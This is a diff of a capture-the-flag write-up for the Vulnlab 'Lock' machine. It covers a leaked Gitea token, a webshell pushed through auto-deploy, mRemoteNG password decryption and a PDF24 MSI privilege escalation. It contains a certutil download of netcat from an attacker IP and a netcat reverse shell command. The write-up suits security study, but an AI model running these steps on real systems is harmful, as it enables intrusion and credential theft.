@@ -2,7 +2,7 @@
 title: "Vulnlab - Easy - Lock"
 date: 2025-11-05 12:00:00 -0700
 categories: [CTF, Vulnlab]
-tags: [windows, git, gitea, dirbust, web discovery]
+tags: [windows, git, gitea, dirbust, web discovery, rdp, mRemoteNG]
 ---
 
 ![Lock](/assets/img/ctf/vulnhub/easy/lock/lock.png))
@@ -13,6 +13,15 @@ tags: [windows, git, gitea, dirbust, web discovery]
 
 # tl;dr
 <details><summary>Spoilers</summary>
+* git clone dev-scripts repo found on :3000<br/>
+* enumerate git history for ellen's personal access token<br/>
+* Use the token to enumerate a private repo called 'website', then clone that repo<br/>
+* the new repo will deploy changes automatically to the server on :80. Upload a revshell or webshell<br/>
+* The VM may need to be reverted several times at this^ step for it to work<br/>
+* After getting the foothold, enumerate ellen's files for a config file<br/>
+* find the app that uses the config file. There's a tool that can be found to decrypt the creds found within<br/>
+* RDP as the new user. Enumerate interesting apps on the desktop and find the version installed.<br/>
+* Run the exploit from cmd to get SYSTEm<br/>
 </details>
 
 # Attack Path
@@ -20,6 +29,8 @@ tags: [windows, git, gitea, dirbust, web discovery]
 ## Recon
 
 ### Service Enumeration
+
+Standard TCP scan to start:
 
 ```bash
 # set host & initiate a standard tcp scan
@@ -44,6 +55,8 @@ PORT     STATE SERVICE       REASON          VERSION
 5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 ```
 
+Notable services:
+
 1. TCP/80 - Webserver
 2. TCP/445 - SMB
 3. TCP/3000 - ???/Git
@@ -55,15 +68,20 @@ PORT     STATE SERVICE       REASON          VERSION
 ![Webserver Landing Page](/assets/img/ctf/vulnhub/easy/lock/1.png)
 
 ```bash
-┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]          └─$ feroxbuster --url $lock --depth 3 --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -C 404 -x php,sh,txt,cgi,html,js,css,py,zip,aspx,pdf,docx,doc,md,log,htm,asp,do
-
-
+┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]          
+└─$ feroxbuster --url $lock --depth 3 --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -C 404 -x php,sh,txt,cgi,html,js,css,py,zip,aspx,pdf,docx,doc,md,log,htm,asp,do
 ```
+
+Conducted a dirbust and file discovery. Nothing of note here.
+
 
 #### TCP/445 - SMB
 
+Performed some SMB enum. Nothing too interesting; no shared drives.
+
 ```bash
-┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]          └─$ enum4linux-ng -A $lock   
+┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]         
+ └─$ enum4linux-ng -A $lock   
 ...
 NetBIOS computer name: LOCK 
 NetBIOS domain name: ''
@@ -80,19 +98,28 @@ OS build: '20348'
 
 #### TCP/3000 - ???/Git
 
+Wasn't too sure initially what this was, other than mention of a Githapp. Explored in-browser and found *Gitea* is served:
+
 ```bash
 http://10.10.92.132:3000/
 ```
 
 ![Gitea Landing Page](/assets/img/ctf/vulnhub/easy/lock/2.png)
 
+Performed web discovery here too:
 
 ```bash
 ┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]      
 └─$ feroxbuster --url http://$lock:3000 --depth 3 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -C 404 -x php,sh,txt,cgi,html,js,css,py,zip,aspx,pdf,docx,doc,md,log,htm,asp,do
-
+...
 http://10.10.92.132:3000/explore/repos
 ```
+
+Found a repo page:
+
+![Gitea Repositories](/assets/img/ctf/vulnhub/easy/lock/3.png)
+
+User *ellen.freeman* has a *dev-scripts* repository available. Let's try to clone it and enumerate it for any intel.
 
 ```bash
 ┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]
@@ -150,88 +177,45 @@ index dcaf2ef..e278e49 100644
 commit 8b78e6c3024416bce55926faa3f65421a25d6370 (HEAD -> main, origin/main, origin/HEAD)                                                                                                                                 
 Author: ellen.freeman <ellen.freeman@localhost.local>
 Date:   Wed Dec 27 11:36:39 2023 -0800
-
-    Update repos.py
-
-diff --git a/repos.py b/repos.py
-index dcaf2ef..e278e49 100644
---- a/repos.py
-+++ b/repos.py
-@@ -1,8 +1,6 @@
- import requests
- import sys
--                               
--# store this in env instead at some point
--PERSONAL_ACCESS_TOKEN = '43ce39bb0bd6bc489284f2905f033ca467a6362f'
-+import os                                                                                                  
-                                                                                                            
- def format_domain(domain):    
-     if not domain.startswith(('http://', 'https://')):
-@@ -28,8 +26,13 @@ def main():              
-                                          
-     gitea_domain = format_domain(sys.argv[1])
-  
-+    personal_access_token = os.getenv('GITEA_ACCESS_TOKEN')
-+    if not personal_access_token:
-+        print("Error: GITEA_ACCESS_TOKEN environment variable not set.")
-+        sys.exit(1)
-+
-     try:
--        repos = get_repositories(PERSONAL_ACCESS_TOKEN, gitea_domain)
-+        repos = get_repositories(personal_access_token, gitea_domain)
-         print("Repositories:")
-         for repo in repos:
-             print(f"- {repo['full_name']}")
-
-
-┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]
-└─$
 ```
-```bash
-┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/dev-scripts]
-└─$ vim repos.py 
 
+Great, I found a *personal access token* that was removed in an earlier commit:
+
+![Git Personal Access Token](/assets/img/ctf/vulnhub/easy/lock/4.png)
+
+We'll probably be able to use that to authenticate with the script in the repo somehow. Let's take a look at the script next.
+
+```bash
 ┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/dev-scripts]
 └─$ python3 repos.py 
 Usage: python script.py <gitea_domain>
 ```
 
-```bash
+![Token added to repos.py](/assets/img/ctf/vulnhub/easy/lock/6.png)
 
+Here's where I edited the code to add the token in for authentication. Now I'll try to re-run the script:
+
+```bash
 ┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/dev-scripts]
 └─$ python3 repos.py http://$lock:3000
 Repositories:
 - ellen.freeman/dev-scripts
 - ellen.freeman/website
-
 ```
 
-```bash
-Powered by Gitea
-Version: 1.21.3
+There's a private repo listed here, *website*. Can we clone it?
 
-http://10.10.92.132:3000/api/swagger#/repository/repoGet
+I tried to get a bit more context first so I edited the script to print the full repo's metadata array:
 
-```
+![Repo array metadata edit](/assets/img/ctf/vulnhub/easy/lock/8.png)
 
-```bash
-┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]
-└─$ curl -H "Authorization: token 43ce39bb0bd6bc489284f2905f033ca467a6362f" -O http://$lock/api/v1/repos/ellen.freeman/website/archive/master.zip                                                                        
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-100  1245  100  1245    0     0   3725      0 --:--:-- --:--:-- --:--:--  3716
+![Repo array metadata raw](/assets/img/ctf/vulnhub/easy/lock/9.png)
 
-┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]
-└─$ unzip master.zip 
-Archive:  master.zip
-  End-of-central-directory signature not found.  Either this file is not
-  a zipfile, or it constitutes one disk of a multi-part archive.  In the
-  latter case the central directory and zipfile comment will be found on
-  the last disk(s) of this archive.
-unzip:  cannot find zipfile directory in one of master.zip or
-        master.zip.zip, and cannot find master.zip.ZIP, period.
+Here I can see the clone URL. I'll rerference that.
 
-```
+This repo is private and will not allow a clone with authentication, unlike the *dev-scripts* repo from earlier. I tried a couple of different methods, including curl and custom headers without any success.
+
+Then I found the following:
 
 [Gitea - cloning a repository](https://forum.gitea.com/t/solved-clone-repo-using-token/1816)
 
@@ -258,16 +242,39 @@ Resolving deltas: 100% (35/35), done.
 On branch main
 Your branch is up to date with 'origin/main'.
 
-nothing to commit, working tree clean                                                                                                                                                                                                                         
-┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/website]  └─$ git config --global user.email "ellen.freeman"                                                                                                                                                                                                      
+nothing to commit, working tree clean                                                                   
+```
+
+I was able to download the *website* repo. Next, I enumerated for useful intel:
+
+![Website readme](/assets/img/ctf/vulnhub/easy/lock/readme.png)
+
+Inside *website/readme.md* a comment states 'CI/CD integration is now active - changes to the repository will automatically be deployed to the webserver'.
+
+It sounds like this will be our way forward to a foothold. We can write files to this repo and then push to the webserver. Sounds like a good opportunity to deploy a webshell or revshell.
+
+## Foothold
+
+Let's do some git stuff and try a test deployment:
+
+```bash
+┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/website]  
+└─$ git config --global user.email "ellen.freeman"                                                                                                                                                                                                      
 ┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/website] 
 └─$ git config --global user.name "ellen.freeman"                                                                                                                                                                    
-┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/website]  └─$ echo "test" > test.txt                                                                                                                                                                                           
+
+┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/website]  
+└─$ echo "test" > test.txt                                                                                                                                                                                           
+
 ┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/website]  
 └─$ git add *                                                                                                 
-┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/website]  └─$ git commit -m "adds test.txt"                                                                        
+
+┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/website]  
+└─$ git commit -m "adds test.txt"                                                                        
+
 [main 236ab92] adds test.txt                                                                                
- 1 file changed, 1 insertion(+)                                                                               create mode 100644 test.txt                           
+ 1 file changed, 1 insertion(+)
+ create mode 100644 test.txt                           
 
 ┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/website]
 └─$ git push                                          
@@ -282,6 +289,14 @@ remote: Processed 1 references in total
 To http://10.10.123.175:3000/ellen.freeman/website.git 
    236ab92..aca371d  main -> main
 ```
+
+![Website test.txt](/assets/img/ctf/vulnhub/easy/lock/11.png)
+
+I was able to add a file to the live website (http://$lock/test.txt).
+
+*NOTE / CAVEAT: This was not successful after many tries. I was 100% certain this HAD to be the way forward. I had to terminate and restart the VM multiple times and re clone the website repo before it actually worked. Frustrating.*
+
+In any case, now having PoC that I can write to the server, I chose to deploy a webshell. Since I enumerated IIS earlier, I chose a common cmd.aspx webshell and pushed it up:
 
 ```bash
 ┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/website]
@@ -310,11 +325,18 @@ To http://10.10.123.175:3000/ellen.freeman/website.git
    236ab92..aca371d  main -> main
 ```
 
+![cmd.aspx webshell](/assets/img/ctf/vulnhub/easy/lock/12.png)
+
+Now catching a webshell should be easy.
+
 ```bash
 certutil -f -urlcache http://10.8.7.193:8000/win/nc64.exe c:\windows\temp\nc.exe
 
-c:\windows\temp\nc.exe -nv 10.8.7.193 80 -e powershell
+c:\windows\temp\nc.exe -nv 10.8.7.193 80 -e cmd
 ```
+
+![Revshell](/assets/img/ctf/vulnhub/easy/lock/13.png)
+
 
 ```bash
 ┌──(haunter㉿kali)-[~/working/vulnlab/easy/lock]
@@ -328,7 +350,13 @@ ls
     Directory: C:\users                               
 Mode                 LastWriteTime         Length Name                                                      ----                 -------------         ------ ----                                                      d-----        12/27/2023   2:00 PM                .NET v4.5                                                 d-----        12/27/2023   2:00 PM                .NET v4.5 Classic                                         d-----        12/27/2023  12:01 PM                Administrator                                             d-----        12/28/2023  11:36 AM                ellen.freeman                                             d-----        12/28/2023   6:14 AM                gale.dekarios                                             d-r---        12/27/2023  10:21 AM                Public           
 ```
+Found another user *gale.dekarios*. I'll look for interesting files next as the current user doesn't have any useful groups or privileges.
+
 ## Lateral Movement / Privilege Escalation
+
+I found a file at *c:\users\ellen.freeman\Documents\config.xml*. Seems like an odd place for a config file so I checked it out.
+
+![Config.xml](/assets/img/ctf/vulnhub/easy/lock/15.png)
 
 ```bash
 c:\Users>powershell
@@ -341,41 +369,29 @@ Install the latest PowerShell for new features and improvements! https://aka.ms/
 PS C:\Users> get-childitem -path c:\users\ -include *.txt,*.pdf,*.doc,*.docx,*.xls,*.xlsx,*.log,*.conf,*.xml -file -recurse -erroraction silentlycontinue
 get-childitem -path c:\users\ -include *.txt,*.pdf,*.doc,*.docx,*.xls,*.xlsx,*.log,*.conf,*.xml -file -recurse -erroraction silentlycontinue
 
-
     Directory: C:\users\ellen.freeman\Documents
 
-
-Mode                 LastWriteTime         Length Name                                                                 
-----                 -------------         ------ ----                                                                 
+Mode                 LastWriteTime         Length Name                                                      ----                 -------------         ------ ----                                              
 -a----        12/28/2023   5:59 AM           3341 config.xml    
 ```
+
+![Encrypted password inside config.xml](/assets/img/ctf/vulnhub/easy/lock/16.png)
+
+There's a password that appears to be encrypted for gale inside the file. The file indicates this is a config file for *mRemoteNG*. I searched to see if we can leverage this in anyway and found the follwing tool:
+
+[mremoteng decrypt tool](https://github.com/gquere/mRemoteNG_password_decrypt)
+
+The instructions say I'll need to run the tool on the entire config file. I copied it over to $attacker and tried to decrypt it:
 
 ```bash
 (Penelope)─(Session [1])> download config.xml                                                                                                                                                                             
 [+] Download OK '/home/haunter/.penelope/LOCK~10.10.76.201_Microsoft_Windows_Server_2022_Standard_x64-based_PC/downloads/config.xml'
 ```
 
-
 ```bash
-Username="Gale.Dekarios"
-TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==
-```
-
-
-
-```bash
-┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]                                                                                                                  
-└─$ git clone https://github.com/gquere/mRemoteNG_password_decrypt.git                                                                                                                                                    
-Cloning into 'mRemoteNG_password_decrypt'...                                                                                                                                                                              
-remote: Enumerating objects: 11, done.                                                                                                                                                                                    
-remote: Counting objects: 100% (11/11), done.                                                                                                                                                                             
-remote: Compressing objects: 100% (9/9), done.                                                                                                                                                                            
-remote: Total 11 (delta 2), reused 10 (delta 2), pack-reused 0 (from 0)                                                                                                                                                   
-Receiving objects: 100% (11/11), done.                                                                                                                                                                                    
-Resolving deltas: 100% (2/2), done.     
-
-
-
+┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]    └─$ git clone https://github.com/gquere/mRemoteNG_password_decrypt.git                                      Cloning into 'mRemoteNG_password_decrypt'...                                                                                                                                                                    
+remote: Enumerating objects: 11, done.                                                                      
+remote: Counting objects: 100% (11/11), done.                                                               remote: Compressing objects: 100% (9/9), done.                                                              remote: Total 11 (delta 2), reused 10 (delta 2), pack-reused 0 (from 0)                                                                                                                                              
 ┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/mRemoteNG_password_decrypt]
 └─$ python3 mremoteng_decrypt.py ../config.xml 
 Name: RDP/Gale
@@ -384,24 +400,84 @@ Username: Gale.Dekarios
 Password: ty8wnW9qCKDosXo6
 ```
 
-[mremoteng decrypt tool](https://github.com/gquere/mRemoteNG_password_decrypt)
+Got gale's creds. Let's connect now to lateral into the account's context.
 
 ```bash
 ┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]
 └─$ rdp-connect /u:gale.dekarios /p:ty8wnW9qCKDosXo6 /v:$lock
 ```
 
-```bash
+![Gale recon](/assets/img/ctf/vulnhub/easy/lock/17.png)
+
+No special privileges or groups for this account either. 
+
+Let's grab the user.txt file before further recon:
+
+![user.txt](/assets/img/ctf/vulnhub/easy/lock/18.png)
+
+## Root / SYSTEM
+
+Poking around shows some app shortcuts on Gale's desktop. *PDF24* was referenced in older versions of the repos found. 
+
+![PDF24](/assets/img/ctf/vulnhub/easy/lock/19.png)
+
+The installed version is *11.15.1* 
+
+Researching shows that there is an exploit for privesc that applies to this version:
+
+[PDF24 Privesc Exploit](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/)
+
+The instructions note that there needs to be a *msi* installer for this exploit to work correctly. I couldn't find it in either user's profile folders, C:\windows\temp, etc. I did finally find it in a hidden folder (_install*
+
+```powershell
 Get-ChildItem -Path 'C:\' -Filter '*.msi' -File -Recurse -Force -ErrorAction SilentlyContinue
 ...
 C:\_install\pdf24-creator-11.15.1-x64.msi
 ```
 
-https://github.com/p1sc3s/Symlink-Tools-Compiled/blob/master/SetOpLock.exe
+This command, much like the one from earlier, will search for interesting files, but also searches hidden folders. 
 
-```powershell
-PS C:\Users\gale.dekarios> msiexec.exe /fa C:\_install\pdf24-creator-11.15.1-x64.msi
+The other piece needed is a compiled *SetOpLock.exe* file. The source code is referenced in the article here if you want to compile it yourself:
+
+[SetOpLock source code](https://github.com/googleprojectzero/symboliclink-testing-tools)
+
+I opted to download a pre-compiled version instead:
+
+[SetOpLock compiled .exe](https://github.com/p1sc3s/Symlink-Tools-Compiled/blob/master/SetOpLock.exe)
+
+Now to run the exploit. I had originally tried running this in Powershell, but had issues. It worked once I switched back to cmd:
+
+```cmd
+C:\Users\gale.dekarios> msiexec.exe /fa C:\_install\pdf24-creator-11.15.1-x64.msi
 ```
-## Root / SYSTEM
-# Lessons Learned
 
+![PDF24 Exploit](/assets/img/ctf/vulnhub/easy/lock/22.png)
+
+1. Run the command from above
+2. A dialogue box will run
+3. A second cmd window will open
+
+Per the exploit instructions, the next step is to 
+* right-click on the new cmd window's title bar and select *properties*
+* click on the link *legacy console mode*
+* select a browser other than IE/Edge to open the link. I selected Firefox
+
+![PDF24 Exploit 2](/assets/img/ctf/vulnhub/easy/lock/23.png)
+
+Next, I entered *cmd.exe* in the top dir bar...
+
+![PDF24 Exploit 3](/assets/img/ctf/vulnhub/easy/lock/24.png)
+
+...and cmd opened as *NT Authority/SYSTEM*
+
+![PDF24 SYSTEM](/assets/img/ctf/vulnhub/easy/lock/25.png
+
+After grabbing root.txt at c:\users\Administrator\Desktop\root.txt I completed Lock :)
+
+
+# Lessons Learned
+* Tokens can be used to authenticate to Git repos
+* VMs sometimes need to be reverted multiple times. Do this if you are sure you have the correct vector
+* Determine what application uses interesting files. E.g., mRemoteNG used the config.xml file we found.
+* Enumerate files in hidden directories
+* look for precombiled binaries if you have issues compiling source code. E.g., in Google "SetOpLock.exe" -filetype:exe
